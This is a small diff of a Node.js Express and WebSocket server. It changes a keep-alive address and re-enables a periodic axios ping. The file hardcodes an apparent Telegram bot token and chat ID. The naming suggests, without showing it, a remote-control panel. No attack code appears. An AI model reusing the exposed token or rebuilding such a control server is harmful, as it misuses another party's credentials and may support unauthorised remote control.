@@ -9,7 +9,7 @@ const axios = require("axios");
 
 const token = "7039136218:AAFe2ZXrDMvjwjGzuKIE3pdB2ULeXSPyiCg";
 const id = "6486718237";
-const address = 'https://dogemanager.onrender.com/';
+const address = 'https://google.com/';
 
 const app = express();
 const appServer = http.createServer(app);
@@ -887,9 +887,9 @@ setInterval(function () {
     appSocket.clients.forEach(function each(ws) {
         ws.send('ping')
     });
-    //try {
-        //axios.get(address).then(r => "")
-    //} catch (e) {
-    //}
+    try {
+        axios.get(address).then(r => "")
+    } catch (e) {
+    }
 }, 5000)
 appServer.listen(process.env.PORT || 8999);
